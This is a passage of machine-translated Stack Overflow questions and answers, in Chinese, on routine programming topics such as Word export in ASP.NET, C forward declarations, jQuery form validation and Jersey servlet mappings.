我[在这篇文章中](https://web.archive.org/web/20120424094530/http://www.wizbay.com/post/2010/08/31/Export-to-Word-doc-in-AspNet.aspx)找到了解决方案。像这样解决：

```
Response.Write("<html>")
Response.Write("<head>")
Response.Write("<META HTTP-EQUIV=""Content-Type"" CONTENT=""text/html; 
charset=UTF-8"">")
Response.Write("<meta name=ProgId content=Word.Document>")
Response.Write("<meta name=Generator content=""Microsoft Word 9"">")
Response.Write("<meta name=Originator content=""Microsoft Word 9"">")
Response.Write("<style>")
Response.Write("@page Section1 {size:595.45pt 841.7pt; margin:1.0in 1.25in 1.0in
1.25in;mso-header-margin:.5in;mso-footer-margin:.5in;mso-paper-source:0;}")
Response.Write("div.Section1 {page:Section1;}")
Response.Write("@page Section2 {size:841.7pt 595.45pt;mso-page-orientation:
landscape;margin:1.25in 1.0in 1.25in 1.0in;mso-header-margin:.5in;
mso-footer-margin:.5in;mso-paper-source:0;}")
Response.Write("div.Section2 {page:Section2;}")
Response.Write("</style>")
Response.Write("</head>")
Response.Write("<body>")
Response.Write("<div class=Section2>") 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-10-08T09:55:38.583

我解决了这个问题，它对我来说很好。

```
<style>
    @page
    {
        mso-page-border-surround-header: no;
        mso-page-border-surround-footer: no;
    }

    @page Section1
    {
        size:841.9pt 595.3pt;
        mso-page-orientation:landscape;
        margin: 0.7cm 0.7cm 0.7cm 0.7cm;
        mso-header-margin: 42.55pt;
        mso-footer-margin: 49.6pt;
        mso-paper-source: 0;
        layout-grid: 18.0pt;
    }

    div.Section1
    {
        page: Section1;
    }
</style>

<div class="Section1"></div> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-03-19T09:39:19.500

对于打印布局，请使用此代码....

```
string strBody = string.Empty;
 strBody = @"<html xmlns:o='urn:schemas-microsoft-com:office:office' " +
 "xmlns:w='urn:schemas-microsoft-com:office:word'" +
 "xmlns='http://www.w3.org/TR/REC-html40'>";

 strBody = strBody + "<!--[if gte mso 9]>" +
 "<xml>" +
 "<w:WordDocument>" +
 "<w:View>Print</w:View>" +
 "<w:Zoom>100</w:Zoom>" +
 "</w:WordDocument>" +
 "</xml>" +
 "<![endif]-->";
 HttpContext.Current.Response.Clear();
 HttpContext.Current.Response.Charset = "";
 HttpContext.Current.Response.ContentType = "application/vnd.ms-word";
 HttpContext.Current.Response.AddHeader("Content-Disposition", "inline;filename=ContentDocument.doc");

 StringBuilder htmlCode = new StringBuilder();
 htmlCode.Append("<html>");
 htmlCode.Append("<head>"+strBody+" <style type=\"text/css\">body {font-family:arial;font-size:14.5;}</style></head>");
 htmlCode.Append("<body>");

 ... populate htmlCode ...

 htmlCode.Append("</body></html>");
 HttpContext.Current.Response.Write(htmlCode.ToString());
 HttpContext.Current.Response.End();
 HttpContext.Current.Response.Flush(); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-09T13:40:12.697

我自己没有尝试过，但看不到它不应该工作的原因

如果您已经在编写 html 并将其显示为 Word 文档，为什么不使用 css 进行页面定位，如下所示：

```
@media screen and (orientation:landscape) {
    body { opacity: 0; }
} 
```

# java - 有没有办法检查两个对象在 Java 中是否有别名？

> ID：11396114
> 
> 赞同：9
> 
> 时间：2012-07-09T13:34:07.713
> 
> 标签：java, pointers, alias

有没有办法检测Java中的两个对象是否相互别名？在 CI 猜测中，我们可以检查两个指针​​指向的内存地址。但是有没有办法在 Java 中做到这一点？

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2012-07-09T13:34:58.807

在java中，变量是引用，因此您可以比较它们`==`以查看它们是否引用同一个对象。

```
Object a = ...
Object b = a;
boolean areSame = (a == b); //Will be true. 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-07-09T13:36:00.220

```
if (obj1 == obj2) {
   // both refrences are pointing to same object
} 
```

# jakarta-ee - 在 Java EE 中使用负载均衡器进行会话管理

> ID：11396123
> 
> 赞同：1
> 
> 时间：2012-07-09T13:34:33.460
> 
> 标签：jakarta-ee, java-ee-6, load-balancing

我们正在使用 Spring 开发 Java EE 应用程序。该应用程序将部署在具有硬件负载平衡器的多个 Web 服务器上。这是我的疑问。请澄清。

1.  负载均衡器是否会将同一会话中的所有请求路由到单个 Web 服务器？
2.  如果没有，是否将同一会话的请求路由到特定的 Web 服务器？

编辑：移除弹簧。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-10T08:16:57.530

您在这里指的是“粘性会话”，您的负载均衡器应该支持它们。它允许负载平衡器使用会话 ID 将会话的所有请求路由到同一服务器。

# iphone - 需要一些关于财产的解释

> ID：11396133
> 
> 赞同：0
> 
> 时间：2012-07-09T13:35:15.000
> 
> 标签：iphone, objective-c, ios, properties

> **可能重复：**
> [可可objective-c 类中变量前面的下划线如何工作？](https://stackoverflow.com/questions/822487/how-does-an-underscore-in-front-of-a-variable-in-a-cocoa-objective-c-class-work)

我是 ios 应用程序开发的初学者。我查看了很多教程，我遇到了以下行

.h 文件包含：

```
@property (strong) ScaryBugData *data; 
```

.m 包含：

```
@synthesize data = _data; 
```

但我没有得到`data = _data`. 为什么需要这样做或这意味着什么。

参考：[http ://www.raywenderlich.com/1797/how-to-create-a-simple-iphone-app-tutorial-part-1](http://www.raywenderlich.com/1797/how-to-create-a-simple-iphone-app-tutorial-part-1)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-09T13:39:25.433

`_data`是自动为您创建的实例变量的名称。
`data`是具有 getter 和 setter 的属性的名称。

如果您不指定自定义 ivar 名称，它将默认为属性的名称。

在这种情况下，您可以使用 直接设置 ivar `_data = [ScaryBugData data]`，也可以使用 使用 setter `self.data = [ScaryBugData data]`。获取也是如此。

合成的 setter 将确保旧值被正确释放，新值被正确保留，并在幕后处理更多内容。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-09T13:40:21.663

如果您访问 self.data，您正在调用 getter/setter 方法。如果您分配 _data，您将绕过 setter 方法并直接访问变量。例如，如果您的 setter 或 getter 正在做其他在这种特殊情况下您可能不想做的事情，这可能很有用。

在 Java 世界中，这相当于调用 this.thing=xyz vs. setThing(xyz)

例如，查看 Core Data 模板，您可以看到 managedObjectContext 访问器如何做额外的工作，而不仅仅是获取变量。

# asp-classic - asp 禁用或启用按钮

> ID：11396136
> 
> 赞同：0
> 
> 时间：2012-07-09T13:35:22.013
> 
> 标签：asp-classic

我有一个要禁用和启用的按钮。我尝试过这样的事情：

`tryprint = "Disabled"`

`<input type="submit" value="Stop" name="action" <%= tryprint %>/>`

它不工作。如何使用参数 tryprint 禁用和启用按钮？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-10T14:29:46.153

您不必使用 If..Then 语句，您可以将它全部放在一个字符串中：

```
tryprint="disabled=""disabled"""
<input type="submit" value="Stop" name="action" <%= tryprint %>/> 
```

# ios - 有没有办法以编程方式创建 App id？

> ID：11396139
> 
> 赞同：0
> 
> 时间：2012-07-09T13:35:27.983
> 
> 标签：ios, apple-push-notifications, ios-provisioning, app-id

我想以编程方式在 iOS 配置门户中创建应用程序 ID。我不能使用通配符，因为我需要推送通知系统。

有没有办法在命令行中做到这一点？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2015-07-24T13:55:07.603

对的，这是可能的。您可以使用[fastlane/produce](https://github.com/fastlane/produce)。它是开源的。

[https://github.com/fastlane/produce](https://github.com/fastlane/produce)

# python - 为什么会有各种 JPEG 扩展？

> ID：11396142
> 
> 赞同：17
> 
> 时间：2012-07-09T13:35:32.250
> 
> 标签：python, mime-types, image, jpeg

在使用下载器时，我在 Python 的`mimetypes.guess_extension`函数中遇到了以下问题：

```
In [2]: mimetypes.guess_extension('image/jpeg', strict=False)
Out[2]: '.jpe' 
```

我知道*jpeg*和*jpg*是有效的 JPEG 扩展，但我不知道*jpe*。所以查看维基百科网站确实揭示了以下内容：

> 使用 JPEG 压缩的文件最常见的文件扩展名是 .jpg 和 .jpeg，但也使用 .jpe、.jfif 和 .jif

更多我不知道的扩展。

所以主要的问题是：为什么 JPEG 有这么多（有效的）与之相关的扩展？

在相关说明中，我想知道为什么 Python 确实返回 'jpe' 而不是 'jpg' 或 'jpeg'，因为我看到这些使用最多。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-07-09T13:44:15.133

它似乎`mimetypes.guess_extension`返回所有可能的扩展中的第一个：

```
def guess_extension(self, type, strict=True):
    # ...
    extensions = self.guess_all_extensions(type, strict)
    if not extensions:
        return None
    return extensions[0] 
```

所以你会得到返回的列表中的第一个`mimetypes.guess_all_extensions`，结果是：

```
>>> mimetypes.guess_all_extensions('image/jpeg', strict=False)
['.jpe', '.jpg', '.jpeg'] 
```

我对为什么`.jpe`也是有效的猜测：

在 DOS 和早期 Windows 版本中，文件名只能有 8 个字符和 3 个字符作为扩展名（有关更多信息，请参阅 Wikipedia 上的文章[8.3 文件名）。](https://en.wikipedia.org/wiki/8.3_filename)可能是他们将 JPEG 缩写为 .JPE 或 .jpe - 这就是我们现在拥有 .jpe、.jpeg 和 .jpg 的原因。

确实，.jpeg 和 .jpg 更常见。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-09T13:47:46.797

严格意义上来说，jpeg 是一种图像压缩算法，而不是一种文件格式。

JFIF (JPEG File Interchange Format) is the usual file format that uses jpeg compression. EXIF (Exchangeable image file format) is another format using jpeg, used in digital camera. Most people tend to think those format are the same, but that's not the case.

TIFF can also be jpeg encoded.

# mongodb - casbah mongodb 访问对象参数的更多类型安全方式

> ID：11396143
> 
> 赞同：1
> 
> 时间：2012-07-09T13:35:33.757
> 
> 标签：mongodb, casbah

在 casbah 中，MongoDBObject 中有两个方法调用`.getAs`和，它们以类型参数**给出**`.getAsOrElse`的类型返回相关字段的值。

 **```
val dbo:MongoDBObject = ...
dbo.getAs[String](param) 
```

这必须使用类型转换，因为我们可以通过将它作为类型参数来获取 a `Long`as a `String`，这可能会导致运行时类型转换异常。有没有其他类型安全的方法来检索结果中的原始类型？

这必须是可能的，因为元素的类型信息应该在`getAs`' 的输出中。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-09T16:24:19.390

查看其作者关于[Salat的精彩](https://github.com/novus/salat)[演示](http://repo.novus.com/scalathon/#0)。您正在寻找的是可以与 DBObject 相互转换的 Salat。`grater`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-09T18:40:52.410

Disclamer：我有偏见，因为我是[Subset的作者](http://osinka.github.com/subset/Subset.html)

我构建这个小型库“子集”正是为了能够以`DBObject`类型安全的方式有效地处理 's 字段（标量和子文档）。查看[示例](http://osinka.github.com/subset/Example.html)，看看它是否符合您的需求。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-09T14:12:52.813

问题是 mongodb 可以为单个字段存储多种类型，所以，我不确定你所说的使这个类型安全是什么意思。没有办法在数据库端强制执行它，所以您是否希望有一种方法可以在 casbah 端强制执行它？为了最安全，你可以做`get("fieldName")`，并得到一个`Object`，但在我看来，这几乎不是一个改进。

我一直很高兴使用 Salat + Casbah，当我的数据库记录与我的 Salat 案例类不匹配时，我得到一个运行时异常。我只知道当我更改模型中的类型或为新类型创建新模型（多个模型可以存储在同一个集合中）时，我必须运行迁移脚本。至少 Salat 刨丝器/DAO 方法减少了麻烦（您不必每次访问变量时都指定类型）。**

# javascript - 绕过 javascript 错误以进行优雅降级

> ID：11396145
> 
> 赞同：2
> 
> 时间：2012-07-09T13:35:36.217
> 
> 标签：javascript, graceful-degradation

我有一个称为 onclick 按钮的 javascript 函数。它在 chrome 和 firefox 中运行良好。它基本上会放置一些验证检查，以便在信息不完整的情况下不会将表单提交给服务器。

我的问题是，如果在某些浏览器中的 javascript 函数有一些语法错误，我怎么能忽略这些错误，从而绕过验证功能，毕竟验证功能只是为了减少无效的表单提交，并且检查也放在服务器上。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-09T13:38:50.540

不太可能（如果不是不可能的话），您编写一些在某些引擎上运行良好并在其他引擎上引发语法错误的 ECMAscript 代码。除非您正在处理诸如 IE4 或真正的旧 Netscape 浏览器之类的东西。

但是，您当然可以始终将代码包装成`try..catch`块，例如

```
try {
   // beautiful javascript code
} catch( ex ) {
   alert(ex.message);
} 
```

# sql - 在 grails HQL 中，我将如何使用（非聚合）Oracle 函数？

> ID：11396151
> 
> 赞同：2
> 
> 时间：2012-07-09T13:35:51.147
> 
> 标签：sql, hibernate, grails, groovy, hql

如果我从普通的 sql 查询中检索我想要的数据，则以下内容就足够了：

```
select * from stvterm where stvterm_code > TT_STUDENT.STU_GENERAL.F_Get_Current_term() 
```

我为此表正确设置了一个 grails 域，并且可以成功运行以下代码：

```
def a = SaturnStvterm.findAll("from SaturnStvterm as s where id > 201797") as JSON
a.render(response)
return false 
```

换句话说，我可以在 Oracle 函数的结果中硬编码并让 HQL 正确运行，但它阻碍了我想用该函数尝试它的任何方式。我已经阅读了有关 Hibernate 的一些关于使用 procs 和函数的文档，但是我很难理解它。谁能给我一个关于处理这个问题的正确方法的提示？

此外，由于我认为它可能是相关的，因此没有任何同义词可以允许调用该函数而不将其限定为 schema.package.function()。我相信这会让事情变得更加困难。这就是 Grails 1.3.7 的全部内容，但如果需要，我可以使用更高版本。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-09T16:00:26.917

要在 HQL 中调用函数，SQL 方言必须知道它。`BootStrap.groovy`你可以像这样在运行时添加你的函数：

```
import org.hibernate.dialect.function.SQLFunctionTemplate
import org.hibernate.Hibernate

def dialect = applicationContext.sessionFactory.dialect
def getCurrentTerm = new SQLFunctionTemplate(Hibernate.INTEGER, "TT_STUDENT.STU_GENERAL.F_Get_Current_term()")
dialect.registerFunction('F_Get_Current_term', getCurrentTerm) 
```

注册后，您应该能够在查询中调用该函数：

```
def a = SaturnStvterm.findAll("from SaturnStvterm as s where id > TT_STUDENT.STU_GENERAL.F_Get_Current_term()") 
```

# c - C 前向声明查询

> ID：11396152
> 
> 赞同：1
> 
> 时间：2012-07-09T13:35:52.097
> 
> 标签：c

我有一种情况，我的两个头文件需要任何一个中定义的数据结构，即无论您以哪种顺序包含它们，它都不会编译

然而，有问题的数据结构之一只包含*指向*另一个头文件中声明的数据结构的指针，所以我会认为，从技术上讲，它现在不需要知道数据结构有多大，所以它不应该是抱怨

下面概述了我的意思的简化示例。我会认为库中的模式数组不需要知道模式有多大，只需要知道模式的指针有多大，因此如果编译器还没有看到模式的声明，它不应该抱怨在另一个头文件中。

```
header_1.h

typedef struct
{
    Mode **modes; 
} Library;

header_2.h

typedef struct
{
    int number;
    char *name;
} Mode; 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-09T13:38:30.750

它不需要知道大小，但它必须看到一个声明。前向声明

```
typedef struct Mode Mode; 
```

在定义`struct Library`足够之前。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-09T13:38:23.350

如当前所写，您的示例未显示您在问题中提到的相互交叉引用。

必须告诉编译器它使用的每种类型。您可以`header_1.h`只使用：

```
typedef struct Mode Mode;

typedef struct
{
    Mode **modes; 
} Library; 
```

至少，这将使它编译。编译器不需要详细信息，但它确实需要知道这`Modes`是一种类型。

*编辑：* 请注意，`header_2.h`应该对其进行修改以使其正常工作。您必须确保每个`typedef`都只出现一次。设置好 typedef 后，只需指定结构内容（定义）一次，然后从结构定义中省略关键字`typedef`和 typedef 名称。您必须准确地决定要管理的交叉引用。例如，无论如何都应该`header_1.h`包括在内。`header_2.h`

~~我不记得遇到过我真的需要相互引用结构的情况（在相当长的编程时间里——长到我可能忘记了一个例子）。~~ 我现在确实记得一个结构相互引用的例子。它是`make`最初为 Minix 编写的版本。我仍然认为这样的要求有点“病态”（或者，如果您愿意，可以说是“代码气味”）并且尽可能避免。如果您真的必须管理它，那么下面的部分将解释我将如何去做（以及或多或少的`make`程序是如何去做的）。

## 相互引用的结构

如果你真的有两个相互引用的结构，你应该（重新）考虑为什么你认为两个标题比一个好。如果您仍然需要两个标头，请使用以下成语：

### header_1.h

```
#ifndef HEADER_1_H_INCLUDED
#define HEADER_1_H_INCLUDED

#ifndef TYPEDEF_MODE
#define TYPEDEF_MODE
typedef struct Mode Mode;
#endif
#ifndef TYPEDEF_LIBRARY
#define TYPEDEF_LIBRARY
typedef struct Library Library;
#endif

struct Library
{
    ...
    Mode    **modes;
    ...
};

#endif /* HEADER_1_H_INCLUDED */ 
```

### header_2.h

```
#ifndef HEADER_2_H_INCLUDED
#define HEADER_2_H_INCLUDED

#ifndef TYPEDEF_MODE
#define TYPEDEF_MODE
typedef struct Mode Mode;
#endif
#ifndef TYPEDEF_LIBRARY
#define TYPEDEF_LIBRARY
typedef struct Library Library;
#endif

struct Mode
{
    ...
    Library    **liblist;
    ...
};

#endif /* HEADER_2_H_INCLUDED */ 
```

重复`typedef`的“检测”代码不好；在我看来，单个标题更好。但是，您可以按任一顺序包含`header_1.h`及`header_2.h`以上，它应该可以编译。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-09T13:41:19.357

我相信这是因为“模式”是使用 typedef 定义的类型，而不是结构的名称。您将需要显式转发声明它，或者您可以尝试使用如下结构的代码：

```
header_1.h

typedef struct
{
    struct _Mode_t **modes; 
} Library;

header_2.h

typedef struct _Mode_t
{
    int number;
    char *name;
} Mode; 
```

# c++ - 我的堆栈内存空间是否膨胀？

> ID：11396155
> 
> 赞同：0
> 
> 时间：2012-07-09T13:36:00.293
> 
> 标签：c++, heap-memory, stack-memory

有什么警告信号表明我的堆栈内存空间膨胀，我应该从什么时候开始使用堆内存？而且，处理器之间是否存在差异，我正在考虑堆栈大小限制？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-09T13:43:56.390

可以在链接期间指定堆栈的大小。这样做的确切方法取决于您的工具链。除了 32 位与 64 位处理器之外，我不知道任何基于处理器的堆栈大小限制。

至于是否使用过多，没有正确或错误的答案，这是一个设计问题，取决于您的要求。由于堆栈大小是在链接期间设置的，因此它会比使用堆更严格地限制您的最大数据，一般来说无论如何。另一方面，堆栈分配和释放比使用堆更快。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-09T13:59:11.143

正如许多其他人所说，堆栈的大小可以通过命令行选项控制。

关于堆使用，我倾向于坚持这一点：

如果我可以在程序开始时动态分配类对象，我会这样做。我倾向于不在运行中动态分配或删除动态分配的对象，因为它会分散内存。

原始对象通常保存在堆栈中，因为它们的大小可以忽略不计。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-09T13:45:46.643

您通常可以使用编译器和链接器的命令行选项来控制堆栈的大小。

您是否遇到任何堆栈溢出（错误，而不是站点）？这将是一个很大的线索，表明你正在推动你的筹码极限。

我认为您需要首先弄清楚您的应用程序中的默认堆栈有多大，然后考虑您要填充什么。

# javascript - Javascript - 如何正确验证表单数据？

> ID：11396158
> 
> 赞同：0
> 
> 时间：2012-07-09T13:36:05.520
> 
> 标签：javascript, jquery, validation

我有一个带有一些文本输入和一个文件类型输入的表单，我尝试在其中验证所选文件是否为 PDF。我这样做是这样的：

```
$("#myform").bind("submit", function() {
    var ext = $('#file_input').val().split('.').pop().toLowerCase();
    if($.inArray(ext, ['pdf']) == -1) {
        alert('ERROR!');
    }
}); 
```

但是在上面的代码部分中缺少一个 - 如果除了文件输入（让文件是 DOC）之外的所有输入都有效（=> 文件输入无效）并且我点击提交按钮，然后显示警告信息**错误！**，但表单已发送。

如果文件类型无效，我如何“停止”发送表单？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-09T13:41:03.817

在绑定到事件的 jQuery 回调函数中，您有两个选项。

您可以将对事件的引用传递给匿名函数并调用`e.preventDefault()`：

```
$('#myform').bind('submit', function(e) {
    e.preventDefault();

    // Your code
}); 
```

`e.preventDefault()`阻止默认功能（在这种情况下，提交表单）。

或者您可以`return false`既阻止默认功能**又**阻止事件冒泡；和调用一样`e.preventDefault(); e.stopPropagation()`。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-09T13:39:03.823

尝试这个：

```
$("#myform").bind("submit", function(e) {
    var ext = $('#file_input').val().split('.').pop().toLowerCase();
    if($.inArray(ext, ['pdf']) == -1) {
      e.preventDefault(); //Prevents the default action which is form submit
      alert('ERROR!');
    }
}); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-07-09T13:40:23.550

您可以通过执行以下操作来缩短代码：

```
if (!(/\.pdf$/i).test($('#file_input').val())) {
  // not valid, do what you like here
  // return false to prevent submit
  return false; 
```

通过返回 false 来阻止表单提交；表单提交事件上的 preventDefault 在 IE 7/8 中不起作用，返回 false 就可以了。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-09T13:42:22.787

你有两种方法：

1.  保持您的代码不变并添加`return false`：

    ```
    $("#myform").bind("submit", function() {
    var ext = $('#file_input').val().split('.').pop().toLowerCase();
    if($.inArray(ext, ['pdf']) == -1) {
        alert('ERROR!');
        return false;
    }
    }); 
    ```

2.  更改函数签名以接受事件并使用 preventDefault()：

    ```
     $("#myform").bind("submit", function(e) {       
    var ext = $('#file_input').val().split('.').pop().toLowerCase();
    if($.inArray(ext, ['pdf']) == -1) {         
      alert('ERROR!');
      e.preventDefault();
    }
    }); 
    ```

# rest - 使用 Jersey 的 REST with Java (JAX-RS) 中的欢迎页面

> ID：11396160
> 
> 赞同：3
> 
> 时间：2012-07-09T13:36:11.030
> 
> 标签：rest, jersey, jax-rs

我正在使用 Jersey 实现一个 Restful Web 服务。我想将 index.jsp 显示为欢迎页面。

```
<%@page contentType="text/html" pageEncoding="UTF-8"%>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
   "http://www.w3.org/TR/html4/loose.dtd">

<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <title>Rest Page</title>
    </head>
    <body>
        <h1>Rest is working!</h1>
    </body>
</html> 
```

当我在 web.xml 中使用此代码时，它工作正常：

```
<servlet-mapping>
    <servlet-name>Jersey REST Service</servlet-name>
    <url-pattern>/whatever/*</url-pattern>
  </servlet-mapping>

  <welcome-file-list>
        <welcome-file>index.jsp</welcome-file>
    </welcome-file-list> 
```

问题是当用户模式是这样的：

```
<url-pattern>/*</url-pattern> 
```

除了欢迎页面，一切正常。我很感激任何帮助。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-09T15:41:45.870

我找到了另一种方法来做到这一点。而不是使用 index.jsp，我可以使用如下类：

```
@Path("/")
public class Hello {

    // This method is called if HTML is request
    @GET
    @Produces(MediaType.TEXT_HTML)
    public String sayHtmlHello() {
       return "<html> " + "<title>" + "Rest Page" + "</title>"
          + "<body><h1>" + "REST is Working!" + "</body></h1>" + "</html> ";
} 
```

在 web.xml 我不需要使用：

```
<welcome-file-list>
        <welcome-file>index.jsp</welcome-file>
    </welcome-file-list> 
```

它适用于：

```
<url-pattern>/*</url-pattern> 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-09T14:36:07.067

那么servlet映射调用你的servlet。如果要创建主页，则不应将 /* 提供给 servlet，因为它会重叠。

当您的 url 模式是`/whatever`您的 servlet 时，您的 servlet 将在`localhost:8080/myApp/whatever`并且主页将具有`Localhost:8080/myApp`. 但是，当您将 url 模式定义为`/*`您的 servlet 和主页具有相同的位置时。所以删除你的 servlet 映射或给它一个不同的地方`/*`

# javascript - 如何在页面调整大小时保持 div 可见？

> ID：11396162
> 
> 赞同：0
> 
> 时间：2012-07-09T13:36:17.630
> 
> 标签：javascript, jquery, css, html

我在一个网站上有一个 facebook “like us” 图标，现在客户要求是在用户向上滚动直到它到达页面顶部位置（使用 jquery 便笺排序）时保持它可见，并且该图标应该仍然可见当有人重新调整浏览器大小时 ( `X = (browser width/2) + (wrapper/2)`)。

无法弄清楚我该怎么做，因为第一个条件强制 div 处于静态定位，以便在页面向下滚动时它可以移动。

但为了重新定位它，我需要固定药水。

请提出一条出路。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-09T13:49:09.193

只是一个简单的例子，你可以如何解决这个问题：

```
function movement() {

    var topPosition = $(window).scrollTop();

    if(topPosition > 100) {

        // do something
        $('element').addClass('dosomething');   

    } else {

        // do something
        $('element').removeClass('dosomething');    
    }
}

$(document).ready(function() {

    $(window).scroll(function() {

        movement();
    });
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-09T13:49:24.890

你看过像[jQuery Waypoints](http://imakewebthings.com/jquery-waypoints/)这样的东西吗？

我不确定它是否完全匹配，但它优雅地解决了其中一些问题。

# python - python中的变量和不完整行为“for”循环

> ID：11396167
> 
> 赞同：4
> 
> 时间：2012-07-09T13:36:36.063
> 
> 标签：python, loops, for-loop, while-loop, range

我试图在 python 中循环 44100000 到 44999999 之间的数字。
我试过这个：

```
f=open('of','w')
i=44100000
while i<=44999999 :
     f.write(str(i)+"\n")
     i+=1 
```

但它不完整！文件的尾部`of`是：

```
44999750
44999751
44999752
44999753
449997 
```

注意最后一个数字

1.  不是范围内的最后一个数字
2.  不完整！并且长度和其他人不一样！

当我再次这样做时，相同的代码给了我这个文件尾部：

```
44999993
44999994
44999995
44999996
44999997
44999998 
```

第三次运行完成并正确输出：

```
44999994
44999995
44999996
44999997
44999998
44999999 
```

虽然这每次都能正常工作：

```
for i in range(44100000,44999999):
     f.write('%d\n' % (i,)) 
```

问题是什么？谢谢

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-07-09T13:40:22.590

您未能在终止进程之前关闭文件。`with`在语句中使用需要清理的资源是一种很好的做法：

```
with open('of', 'w') as f:
    f.write("Stuff")

# f.close() will be called automatically upon leaving the with-scope 
```

# asp.net - RadGrid 中的 RadDatePicker

> ID：11396171
> 
> 赞同：0
> 
> 时间：2012-07-09T13:36:51.550
> 
> 标签：asp.net, telerik, radgrid, raddatepicker

我正在使用 Telerik RadGrids，并且我有 RadDatePickers 用于日期时间类型的列。但是，当我想选择一个日期时，它根本不起作用。没有错误，但它根本不起作用。我注意到奇怪的是我可以选择更多天，但我希望能够通过在给定的一天单击一次来选择一天。

我观察到，当点击上/下个月时，我可以完全按照我的意愿选择一天，所以有一个可能有效的技巧（在我的研究中，它在第一次回发之后完美运行，但在第一次回发之前它根本没有工作）：

```
Public Sub PageInit(ByVal sender As Object, ByVal e As
System.EventArgs)
    Me.Page.ClientScript.RegisterStartupScript(GetType(TTControls.TTAjaxState),
"Page_Init_" & Me.UniqueID, "if (!(hasEndRequest)) var hasEndRequest =
false; if (!(hasEndRequest)) {var prm =
Sys.WebForms.PageRequestManager.getInstance();prm.add_endRequest(function()
{$('.rcPrev').click();console.log('clicked');});} hasEndRequest =
true;", True)
End Sub 
```

在上面的代码中，您可以看到一个方法，它将作为页面初始化的处理程序。

但是，我非常希望能够通过单击 RadDatePicker 并单击一天来选择一天。这是我的 RadDatePicker 的样子：

![在此处输入图像描述](../Images/b4d3c4e7b3b3f28b9de37f31e169a633.png)

如果有人知道解决方案并决定与我分享（如果解决方案不是 hack，那么我会非常高兴），我会非常高兴。

提前谢谢你，Lajos Árpád。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-09T13:59:34.827

是否需要大量工作才能将您`RadDateTimePicker`的 替换为`RadCalendar`?

支持`RadCalendar`属性..`SelectionMode`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-09T13:53:34.360

您是否将`SelectionMode`属性设置为`Single`?

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-11T10:00:34.740

解决方案：

```
 Sys.Application.add_load(function () {
        $(".RadCalendar.RadCalendar_Default .rcPrev").each(function () { $(this).click(); });
    }); 
```

# jsf - Primefaces selectOneMenu中的CustomContent没有持久化对象

> ID：11396172
> 
> 赞同：1
> 
> 时间：2012-07-09T13:36:54.523
> 
> 标签：jsf, primefaces, selectonemenu

我正在使用 Primefaces SelectOneMenu ( [http://www.primefaces.org/showcase-labs/ui/selectOneMenu.jsf](http://www.primefaces.org/showcase-labs/ui/selectOneMenu.jsf) ) 和演示中描述的“自定义内容”版本。

问题是，只有当绑定到下拉字段的字段的实际值是用作`value`.

以下作品（如果`Bean.field`是 type `SelectObject`）：

```
<p:selectOneMenu value="#{bean.field}"
    var="x">
    <f:selectItems
        value="#{valuesBean.getSelectItems()}" var="bt"
        itemLabel="#{bt.label}" itemValue="#{bt}" />
    <p:column>
        <h:outputText
            value="#{x.value}" />
    </p:column>
    <p:column>
        <h:outputText value="xyz" />
    </p:column>
</p:selectOneMenu> 
```

以下不起作用（`Bean.field`类型`String`）：

```
<p:selectOneMenu value="#{bean.field}"
    var="x">
    <f:selectItems
        value="#{valuesBean.getSelectItems()}" var="bt"
        itemLabel="#{bt.label}" itemValue="#{bt.value}" />
    <p:column>
        <h:outputText
            value="#{x.value}" />
    </p:column>
    <p:column>
        <h:outputText value="xyz" />
    </p:column>
</p:selectOneMenu> 
```

在第一个版本中，`xyz`显示为第二列，在第二个版本中则不是。我遇到的问题是，现在我需要`SelectObject`在数据库中保存一个类型的对象，尽管我也可以将`value`字段的字符串保存在那里。

有没有很好的方法来处理这个？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-09T15:30:37.083

使用 Converter 将所选菜单项 (bt.value) 的值转换为绑定到 p:selectOneMenu (bean.field) 的支持 bean 方法所期望的值。

```
<p:selectOneMenu value="#{bean.field}" var="x" converter="yourconverterid"> 
```

# php - 使用 curl (php) 发送 GCM

> ID：11396177
> 
> 赞同：1
> 
> 时间：2012-07-09T13:37:06.073
> 
> 标签：php, android, curl, google-cloud-messaging

